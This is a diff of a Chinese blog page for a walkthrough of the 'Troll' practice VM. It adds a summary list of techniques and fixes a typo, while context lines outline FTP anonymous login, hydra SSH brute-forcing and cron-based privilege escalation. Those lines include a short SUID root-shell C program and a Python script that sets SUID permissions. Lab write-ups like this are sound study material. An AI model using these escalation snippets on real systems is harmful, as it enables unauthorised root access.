@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权) nmap或netdiscover进行主机发现 端口扫描 看到了三个开启的tcp端口 UDP扫描 服务扫描 得到了中间件或者协议的版本信息以及操作系统类型和版本 nikto和dirb扫描 看到里面提到robots">
+  <meta name="description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Troll">
 <meta property="og:url" content="http://example.com/2023/06/26/Troll/index.html">
 <meta property="og:site_name" content="阿卡丽的神秘商店">
-<meta property="og:description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权) nmap或netdiscover进行主机发现 端口扫描 看到了三个开启的tcp端口 UDP扫描 服务扫描 得到了中间件或者协议的版本信息以及操作系统类型和版本 nikto和dirb扫描 看到里面提到robots">
+<meta property="og:description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626192813401.png">
 <meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626193035047.png">
@@ -72,7 +72,7 @@
 <meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626225343552.png">
 <meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230627122510260.png">
 <meta property="article:published_time" content="2023-06-26T10:08:30.000Z">
-<meta property="article:modified_time" content="2023-07-02T22:39:54.113Z">
+<meta property="article:modified_time" content="2023-07-06T14:54:28.932Z">
 <meta property="article:author" content="akali">
 <meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
@@ -272,7 +272,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-03 06:39:54" itemprop="dateModified" datetime="2023-07-03T06:39:54+08:00">2023-07-03</time>
+                <time title="修改时间：2023-07-06 22:54:28" itemprop="dateModified" datetime="2023-07-06T22:54:28+08:00">2023-07-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,6 +296,13 @@
 
       
         <p>思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)</p>
+<span id="more"></span>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ol>
+<li>ftp匿名登陆</li>
+<li>wireshark分析包</li>
+<li>hydra破解密码</li>
+<li>提权：内核版本漏洞提权、定时任务提权：ssh提权和文件特性提权</li>
+</ol>
 <h3 id="nmap或netdiscover进行主机发现"><a href="#nmap或netdiscover进行主机发现" class="headerlink" title="nmap或netdiscover进行主机发现"></a>nmap或netdiscover进行主机发现</h3><p><img src="/2023/06/26/Troll/image-20230626192813401.png" alt="image-20230626192813401"></p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193035047.png" alt="image-20230626193035047"></p>
 <p>看到了三个开启的tcp端口</p>
@@ -350,7 +357,7 @@
 <p>该payload生成了一个文件/root/.ssh/authorized_keys，等待两分钟后cronlog触发cleaner.py就可以使用root直接登录靶机</p>
 <h4 id="文件特性提权"><a href="#文件特性提权" class="headerlink" title="文件特性提权"></a>文件特性提权</h4><p>构造两个文件分别是suid.c和suid.py</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudi.c</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># suid.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    os.system(<span class="string">&#x27;chown root:root /tmp/suid; chmod 4777 /tmp/suid&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
-<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将sudi.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
+<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将suid.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
 <p><img src="/2023/06/26/Troll/image-20230627122510260.png" alt="image-20230627122510260"></p>
 
     </div>
@@ -435,7 +442,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%88%96netdiscover%E8%BF%9B%E8%A1%8C%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">nmap或netdiscover进行主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">UDP扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="nav-number">4.</span> <span class="nav-text">服务扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nikto%E5%92%8Cdirb%E6%89%AB%E6%8F%8F"><span class="nav-number">5.</span> <span class="nav-text">nikto和dirb扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-number">6.</span> <span class="nav-text">查看文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95ftp"><span class="nav-number">7.</span> <span class="nav-text">尝试ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wireshark%E5%88%86%E6%9E%90%E5%8C%85"><span class="nav-number">8.</span> <span class="nav-text">wireshark分析包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%9C%AC%E5%92%8C%E8%B4%A6%E5%8F%B7%E6%9C%AC"><span class="nav-number">9.</span> <span class="nav-text">获得密码本和账号本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8hydra%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="nav-number">10.</span> <span class="nav-text">使用hydra进行爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">内核版本漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="nav-number">12.</span> <span class="nav-text">获得目标文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E8%AE%A1%E5%88%92%E6%8F%90%E6%9D%83"><span class="nav-number">13.</span> <span class="nav-text">定时计划提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E6%8F%90%E6%9D%83"><span class="nav-number">13.1.</span> <span class="nav-text">ssh提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7%E6%8F%90%E6%9D%83"><span class="nav-number">13.2.</span> <span class="nav-text">文件特性提权</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">知识点总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%88%96netdiscover%E8%BF%9B%E8%A1%8C%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.1.</span> <span class="nav-text">nmap或netdiscover进行主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP%E6%89%AB%E6%8F%8F"><span class="nav-number">1.3.</span> <span class="nav-text">UDP扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.</span> <span class="nav-text">服务扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nikto%E5%92%8Cdirb%E6%89%AB%E6%8F%8F"><span class="nav-number">1.5.</span> <span class="nav-text">nikto和dirb扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">查看文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95ftp"><span class="nav-number">1.7.</span> <span class="nav-text">尝试ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wireshark%E5%88%86%E6%9E%90%E5%8C%85"><span class="nav-number">1.8.</span> <span class="nav-text">wireshark分析包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%9C%AC%E5%92%8C%E8%B4%A6%E5%8F%B7%E6%9C%AC"><span class="nav-number">1.9.</span> <span class="nav-text">获得密码本和账号本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8hydra%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="nav-number">1.10.</span> <span class="nav-text">使用hydra进行爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">1.11.</span> <span class="nav-text">内核版本漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="nav-number">1.12.</span> <span class="nav-text">获得目标文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E8%AE%A1%E5%88%92%E6%8F%90%E6%9D%83"><span class="nav-number">1.13.</span> <span class="nav-text">定时计划提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E6%8F%90%E6%9D%83"><span class="nav-number">1.13.1.</span> <span class="nav-text">ssh提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7%E6%8F%90%E6%9D%83"><span class="nav-number">1.13.2.</span> <span class="nav-text">文件特性提权</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -451,7 +458,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">100</span>
+          <span class="site-state-item-count">103</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
